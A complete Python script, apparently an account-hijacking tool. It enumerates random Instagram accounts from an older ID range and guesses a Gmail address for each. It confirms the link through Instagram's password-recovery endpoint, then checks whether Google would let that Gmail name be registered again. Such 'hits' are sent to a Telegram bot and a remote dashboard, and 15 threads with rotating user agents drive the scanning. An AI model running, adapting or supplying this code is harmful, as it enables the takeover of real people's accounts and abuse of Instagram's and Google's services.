import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from threading import Thread, Lock
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from colorama import init

init(autoreset=True)

# ================= FIXED DASHBOARD SYNC LOGIC =================
def send_to_dashboard(stat_type):
    try:
        # Render Live URL - Dashboard stats sync
        url = 'https://system-override-v2.onrender.com/update_stats'
        requests.post(url, json={'type': stat_type}, timeout=3)
    except:
        pass

# Dashboard passes ID and Token automatically as arguments
if len(sys.argv) > 2:
    ID = sys.argv[1]
    TOKEN = sys.argv[2]
else:
    ID = input("\033[1;36mEnter Telegram ID: ")
    TOKEN = input("\033[1;36mEnter Bot Token: ")
# =============================================================

# Config
INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
TOKEN_FILE = 'tl.txt'
eizon_domain = '@gmail.com' 

# Global Stats & Lock
hits = 0
bad_count = 0
good_ig = 0
stats_lock = Lock()

def get_google_token():
    """Initial Google Token Setup for Gmail Checking"""
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        headers = {'google-accounts-xsrf': '1', 'User-Agent': generate_user_agent()}
        res = requests.get("https://accounts.google.com/signin/v2/usernamerecovery?hl=en-GB", headers=headers)
        match = re.search('data-initial-setup-data=".*?&quot;(.*?)&quot;', res.text)
        if match:
            tok = match.group(1)
            host = ''.join(choice(alphabet) for _ in range(20))
            with open(TOKEN_FILE, 'w') as f:
                f.write(f"{tok}//{host}")
        else:
            time.sleep(2)
            get_google_token()
    except:
        time.sleep(2)
        get_google_token()

if not os.path.exists(TOKEN_FILE):
    get_google_token()

def check_gmail(email_prefix):
    global hits, bad_count
    try:
        if not os.path.exists(TOKEN_FILE): get_google_token()
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().split('//')
            tl, host = token_data[0], token_data[1]
            
        headers = {'google-accounts-xsrf': '1', 'User-Agent': generate_user_agent()}
        data = f"f.req=%5B%22TL%3A{tl}%22%2C%22{email_prefix}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
        res = requests.post("https://accounts.google.com/_/signup/usernameavailability", headers=headers, data=data, cookies={'__Host-GAPS': host})
        
        if '"gf.uar",1' in res.text:
            with stats_lock: hits += 1
            send_to_dashboard('hit')
            return True
        else:
            with stats_lock: bad_count += 1
            send_to_dashboard('bad')
            return False
    except: return False

def check_instagram(email):
    global good_ig, bad_count
    headers = {'User-Agent': generate_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'signed_body': f'sign.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","query":"{email}"}}', 'ig_sig_key_version': '4'}
    try:
        res = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
        if email in res:
            with stats_lock: good_ig += 1
            if check_gmail(email.split('@')[0]):
                send_hit_telegram(email)
        else:
            send_to_dashboard('bad')
            with stats_lock: bad_count += 1
    except: pass

def send_hit_telegram(email):
    user = email.split('@')[0]
    info_text = f"""
━━━━━━━━━━━━━━━ 🚀
☄️ HIT FOUND (2013-15)
🛰 USER: {user}
🌠 EMAIL: {email}
💀 OWNER: Peter
━━━━━━━━━━━━━━━
"""
    try:
        # NO BRACKETS: Fixes the 404/Telegram Message issue
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}", timeout=10)
    except:
        pass

def worker():
    while True:
        lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        # Targeted UID range for 2013-2015 accounts
        data = {
            'lsd': lsd,
            'variables': json.dumps({'id': random.randrange(266028916, 1900000000), 'render_surface': 'PROFILE'}),
            'doc_id': '25618261841150840'
        }
        try:
            res = requests.post('https://www.instagram.com/api/graphql', headers={'X-FB-LSD': lsd}, data=data)
            user_data = res.json().get('data', {}).get('user', {})
            username = user_data.get('username')
            if username:
                check_instagram(username + eizon_domain)
        except:
            time.sleep(1)

# Threads - Render Free Tier stability
for _ in range(15):
    Thread(target=worker, daemon=True).start()

while True:
    time.sleep(10)
